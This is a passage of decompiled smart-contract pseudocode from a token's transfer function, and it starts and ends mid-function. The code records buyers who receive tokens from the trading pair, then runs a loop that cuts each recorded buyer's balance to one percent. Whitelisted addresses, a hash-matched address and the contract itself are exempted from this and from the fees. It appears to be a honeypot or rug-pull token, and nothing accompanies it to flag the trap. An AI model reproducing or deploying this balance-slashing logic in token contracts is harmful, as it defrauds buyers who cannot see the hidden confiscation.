                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    mem[(2 * ceil32(return_data.size)) + 152] = this.address
                    mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    mem[64] = (4 * ceil32(return_data.size)) + 148
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if ext_call.return_data[12 len 20] != msg.sender:
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if arg1 == ext_call.return_data[12 len 20]:
                            if stor16[address(msg.sender)]:
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if arg1 == this.address:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor18:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if not arg2:
                                    require arg2 <= _maxTxAmount
                                    require ext_code.size(address(stor20.field_8))
                                    staticcall address(stor20.field_8).factory() with:
                                            gas gas_remaining wei
                                    mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                    require ext_code.size(address(stor20.field_8))
                                    staticcall address(stor20.field_8).WETH() with:
                                            gas gas_remaining wei
                                           args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                    mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                    require ext_code.size(address(ext_call.return_data[0]))
                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                            gas gas_remaining wei
                                           args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    if ext_call.return_data[12 len 20] == arg1:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      arg1,
                                        return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                    stor19.length++
                                    stor19[stor19.length].field_0 = arg1
                                    stor19[stor19.length].field_256 = arg2
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                else:
                                    if arg2 and _fee > -1 / arg2:
                                        revert with 'NH{q', 17
                                    if not arg2:
                                        revert with 'NH{q', 18
                                    if arg2 * _fee / arg2 != _fee:
                                        revert with 0, 'SafeMath: multiplication overflow'
                                    require arg2 <= _maxTxAmount
                                    require ext_code.size(address(stor20.field_8))
                                    staticcall address(stor20.field_8).factory() with:
                                            gas gas_remaining wei
                                    mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                    require ext_code.size(address(stor20.field_8))
                                    staticcall address(stor20.field_8).WETH() with:
                                            gas gas_remaining wei
                                           args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                    mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                    require ext_code.size(address(ext_call.return_data[0]))
                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                            gas gas_remaining wei
                                           args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    if ext_call.return_data[12 len 20] == arg1:
                                        if arg2 < arg2 * _fee / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[0] += arg2 * _fee / 100
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 - (arg2 * _fee / 100),
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      arg1,
                                        if arg2 * _fee / 100 > 0:
                                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                                          arg2 * _fee / 100,
                                                          mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                          msg.sender,
                                                          0,
                                        return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                    stor19.length++
                                    stor19[stor19.length].field_0 = arg1
                                    stor19[stor19.length].field_256 = arg2
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if stor16[address(arg1)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if arg1 == this.address:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if ext_call.return_data[12 len 20] != msg.sender:
                            if msg.sender == address(ext_call.return_data[0]):
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                        else:
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                        if stor18:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if not arg2:
                            require arg2 <= _maxTxAmount
                            require ext_code.size(address(stor20.field_8))
                            staticcall address(stor20.field_8).factory() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(address(stor20.field_8))
                            staticcall address(stor20.field_8).WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[(15 * ceil32(return_data.size)) + 268] = this.address
                            mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                            require ext_code.size(address(ext_call.return_data[0]))
                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            if ext_call.return_data[12 len 20] == arg1:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                            stor19.length++
                            stor19[stor19.length].field_0 = arg1
                            stor19[stor19.length].field_256 = arg2
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                        else:
                            if arg2 and _fee > -1 / arg2:
                                revert with 'NH{q', 17
                            if not arg2:
                                revert with 'NH{q', 18
                            if arg2 * _fee / arg2 != _fee:
                                revert with 0, 'SafeMath: multiplication overflow'
                            require arg2 <= _maxTxAmount
                            require ext_code.size(address(stor20.field_8))
                            staticcall address(stor20.field_8).factory() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(address(stor20.field_8))
                            staticcall address(stor20.field_8).WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[(15 * ceil32(return_data.size)) + 268] = this.address
                            mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                            require ext_code.size(address(ext_call.return_data[0]))
                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            if ext_call.return_data[12 len 20] == arg1:
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                                return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                            stor19.length++
                            stor19[stor19.length].field_0 = arg1
                            stor19[stor19.length].field_256 = arg2
                            if arg2 < arg2 * _fee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100 > 0:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                        return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                    idx = 0
                    while idx < stor19.length:
                        mem[0] = stor19[idx].field_0
                        mem[32] = 13
                        _764 = mem[64]
                        mem[64] = mem[64] + 64
                        mem[_764] = 26
                        mem[_764 + 32] = 'SafeMath: division by zero'
                        if idx >= stor19.length:
                            revert with 'NH{q', 50
                        mem[0] = stor19[idx].field_0
                        mem[32] = 13
                        balanceOf[stor19[idx].field_0] = balanceOf[stor19[idx].field_0] / 100
                        if idx == -1:
                            revert with 'NH{q', 17
                        idx = idx + 1
                        continue 
                    stor19.length = 0
                    mem[0] = 19
                    idx = 0
                    while 2 * stor19.length > idx:
                        stor19[idx].field_0 = 0
                        stor19[idx].field_256 = 0
                        idx = idx + 2
                        continue 
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7062 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7068 = mem[_7062]
                    require mem[_7062] == mem[_7062 + 12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7086 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7092 = mem[_7086]
                    require mem[_7086] == mem[_7086 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_7092)
                    require ext_code.size(address(_7068))
                    staticcall address(_7068).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_7092)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7110 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    require mem[_7110] == mem[_7110 + 12 len 20]
                    if arg1 != mem[_7110 + 12 len 20]:
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7164 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7182 = mem[_7164]
                        require mem[_7164] == mem[_7164 + 12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7230 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7260 = mem[_7230]
                        require mem[_7230] == mem[_7230 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_7260)
                        require ext_code.size(address(_7182))
                        staticcall address(_7182).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_7260)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7418 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7488 = mem[_7418]
                        require mem[_7418] == mem[_7418 + 12 len 20]
                        if mem[_7418 + 12 len 20] != msg.sender:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7854 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7854 + 32 len mem[_7854]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_7488):
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
